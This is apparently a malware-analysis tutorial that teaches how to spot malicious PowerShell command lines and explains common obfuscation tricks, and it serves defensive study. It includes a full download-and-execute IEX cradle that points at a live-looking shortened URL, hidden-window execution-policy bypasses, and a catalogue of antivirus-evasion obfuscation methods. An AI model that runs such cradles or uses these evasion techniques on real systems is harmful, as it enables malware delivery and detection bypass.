---
title: Powershell 101 in Malware Analysis
tags: Malware-Analysis
---

PowerShell attacks are currently the popular weapon of alternative for several of those attacks as a result of it provides variety of techniques for bypassing existing security. Not least of all, the flexibility to run directly in memory and remotely download payloads gave a lot of benefits to attacker.

Let's learn a little bit about Powershell malicious command line.

# Download
```
powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')
```
Powershell command that are use to download "something" can be consider as a high potentially of a malicious attack. The command above indicate that the command is run to download strings (payload) at URL `https://tinyurl.com/y5nupk4e`. A goodware will never do such a thing to download their file using powershell command.

# Lower and upper case letters
```
Powershell -ExecUTIONPoLICy BypASs -wiNDoWSTYLe hidDeN(NEW-objecT.SYstEM.NET.wEbCLIeNt).DOWnLoADFiLE(<removed>);
```
This pattern of powershell is using alternating lower and upper case letters to execute their command. It's a high potentially of a malicious command when it come with this pattern.

# Using short flags

```
Powershell -nop -w hidden -e <encoded text>
Powershell -nop -w hidden -e <ps1 file>
```
Sometimes, this pattern of command uses by goodwares to does their job backgroundly. If the command included a long encoded text, I can 100% sure that those command is a malicious. Legit software will never use encoded text to execute it's job.

For `.ps1` part, recognizing the location of the ps1 file and its name can help us to determine it's a malicious or not. If you can get the hash of the `.ps1`, drop it into Google/Virustotal/Sandbox to futher investigation.

Short flags reference:

| Parameters | short parameters |
| --- | --- |
| -Command | -c | 
| -EncodedArguments | -ea, -encodeda | 
| -EncodedCommand| -e, -ec, -enc | 
| -ExecutionPolicy| -ex, -ep | 
| -File| -f | 
| -Help| -h,-? or /h,/? | 
| -InputFormat| -i, -if | 
| -NoExit| -noe | 
| -NoLogo| -nol | 
| -NoProfile| -nop | 
| -NonInteractive| -noni | 
| -OutputFormat| -o, -of | 
| -Sta | -s | 
| -WindowStyle | -w | 

For more information about parameters, refer this [Microsoft docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1).

Also this picture explained it all:

![2020-08-03-14-03-40](https://user-images.githubusercontent.com/56353946/133959319-ce445c68-aa03-4ada-ab84-777cbacb1430.png)

# Using encoded commands
```
Powershell -EncodedCommand SQBmACgAJABQAFMAVgB
Powershell -e SQBmACgAJABQAFMAVgB
Powershell -enc SQBmACgAJABQAFMAVgB
```
The `-encodedcommand` is long version of `-e` parameter. They both does a same job where is the function of this parameter is to execute encoded command.

# Invoke expression
```
Powershell -Invoke-Expression (("New-Object Net.WebClient")).(’Downloadfile.ps1’)
```

`Invoke-Expression` or `IEX` cmdlet evaluates or runs a specified string as a command. So, anything after Invoke-Expression will be assume as command execution.

# Using ”[char]” instead of a character
```
Powershell ... $cs = [char]71; $fn = $env:temp+$cs; ...
```

Malware often usen "[char]" to replace with character to evade or bypass AV. Also this type of command pattern often used to slow malware analyst's investigation progress.

# Reading data in base 64
```
IEX $s=New-Object IO.MemoryStream([Convert]::FromBase64String(’<removed>’));
```

Base64 encoding often used in malware payload.

# Using UTF8 encoding
```
$f=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<removed>’));
```

# Using a random name for a variable in every run
```
powershell iex $env:vruuyg
```

Example of usage:
![2020-08-03-14-11-32](https://user-images.githubusercontent.com/56353946/133959329-048ad6aa-de9a-4fae-86cf-10a0b29069ad.png)

If we look into properties's envinronment, we can see that the variable `pajsj` has value of the command execution.

![2020-08-03-14-12-38](https://user-images.githubusercontent.com/56353946/133959335-f95886bf-4db5-496d-8007-d0ef8e26d520.png)

# and many more...

We need to consider these command-line arguments, such as:

```
ExecutionPolicy Bypass, 
-Exec Bypass, 
-ep bypass, 
-EncodedCommand, 
-enc
-NonInteractive, 
-NonI, 
-NoLogo, 
-NoProfile, 
-NoP, 
-WindowStyle Hidden, 
-w Hidden
```

Example of powershell obfuscation:

![2020-08-03-13-52-18](https://user-images.githubusercontent.com/56353946/133959346-2b6357d5-48d5-43f7-82c7-ba1487e5e453.png)

3 layer obfuscation:

![2020-08-03-13-53-26](https://user-images.githubusercontent.com/56353946/133959356-dbf43662-3f97-4024-bf59-f15d0acb414a.png)

A code snapshot of macro malware that uses “^” for command shell obfuscation

![2020-08-03-13-55-57](https://user-images.githubusercontent.com/56353946/133959370-ba894e7b-cf0b-49c8-9317-d9f36199b64e.png)

Another complex obfuscation in malware wild.

![2020-08-03-14-14-31](https://user-images.githubusercontent.com/56353946/133959382-1c444469-5fee-4c07-9b88-829bfa938b14.png)

and many more.

# Short note on obfuscation

 - The URL is just a string, so can be concatenated and written in other
   ways such as `“h” + “ttp”`. Additional string obfuscation techniques
   are covered below.
 - `System` is optional in PowerShell type names, so `System.Net.WebClient` can be written as `Net.WebClient` 
 - PowerShell can use either single or double quotes in strings. Whitespace can be added almost anywhere, so `DownloadString(‘` could just as easily be written as `DownloadString( “` 
 - The WebClient class offers many methods to download content in addition to `DownloadString`, such as `DownloadFile`, `DownloadData`, and `OpenReadAsync` 
 - Method names such as `DownloadString` can be included in quotes and have escape characters included to create a syntax like 
 ```
 System.Net.WebClient).”`D`o`wn`l`oa`d`Str`in`g” 
```
 
 Because it can be treated as a string, string-based obfuscation techniques such as concatenation and reordering can also be used on the method name. 
 - Similar to method names, the `Net.WebClient` argument to `New-Object` can be obfuscated with escape characters, string-based obfuscation techniques, and concatenation across multiple variables. That can produce a result like: 
```
$var1="`N`et."; 
$var2="`W`eb`C`l`ient"; 
(New-Object $var1$var2) 
```
 -  PowerShell command names often have aliases. For example, `Invoke-Expression` can also be referred to as `iex`. 
 - Even when commands do not have aliases, the `Get-Command` command lets a script author query the PowerShell command list and invoke the result. This query can include wildcards, so invoking `New-Object` can look like this: `& (Get-Command *w-O*)`. The invocation (`&`) operator in this example has an alternative, which is the dot (`.`) operator. The `Get-Command` cmdlet has an alias and can be dynamically invoked similarly, so is not safe to key on. 
- In addition to `Get-Command` as a mechanism to query command names, PowerShell offers several API-style methods to query command names – such as `$executionContext.InvokeCommand.GetCommand()`. 
- The invocation (& and .) operators support string arguments. These can be easily obscured using obfuscation techniques such as string concatenation and string reordering. 
 -  Detection of `Invoke-Expression` suffers from the same challenges of command obfuscation that `New-Object` and `Get-Command` suffer from. It is also popular in non-malicious contexts, making false positives based on this indicator a significant challenge. 
- `Invoke-Expression` is not the only cmdlet or technique that can be used to invoke dynamicallygenerated code. Other alternatives are `Invoke-Command`, Script Block invocation (such as `& [Scriptblock]::Create("Write-Host Script Block Conversion")` ), and dynamic script invocation APIs such as `$ExecutionContext.InvokeCommand.InvokeScript("Write-Host EXPRESSION")`.

# String obfuscation

Anything that allows a string as an argument can be obfuscated using string obfuscation techniques. 
- String concatenation is a common way to break up identifiable strings. If a signature is written for the term, `“http”`, it can also be written as `“h” + “ttp”`. The most common form of concatenation is the `‘+’` operator, but PowerShell’s `–join` operator can also be used. In addition to PowerShell techniques, the `String.Join()` and `String.Concat()` methods from .NET can accomplish the same goals. 
- PowerShell’s `–f` string formatting operator, based on the C# `String.Format` method, can create strings at runtime. The format operator uses format tokens like `{0}` and `{1}` to identify the order of replacement strings, so obfuscating the invocation of `New-Object` might look like this with format operator obfuscation applied: `& ("{1}{0}{2}" -f 'wOb','Ne','ject')`. 
- Strings can be reversed through several mechanisms, such as PowerShell’s array slicing operator `(-join "detacsufbO"[9..0])`, Array.Reverse (`$a = [char[]]"detacsufbO"; [Array]::Reverse($a); -join $a`), reverse regular expression matching (`-join [RegEx]::Matches("detacsufbO",'.','RightToLeft')`), and others. 
- Strings can be split by an arbitrary delimiter, and then rejoined: `-join ("Obf~~usc~~ated" -split "~~")` 
- Through the `–replace` operator or the `String.Replace()` method, strings can be replaced either to remove delimiters, or change the meaning of a string: `"System.SafeClass" -replace "Safe","Unsafe"`


ref: 
1. https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf
2. Research Paper "Detecting Malicious PowerShell Commands
using Deep Neural Networks" by Danny Hendler, Shay Kels and Amir Rubin.
3. https://www.trendmicro.com/vinfo/pl/security/news/security-technology/security-101-the-rise-of-fileless-threats-that-abuse-powershell
4. https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf
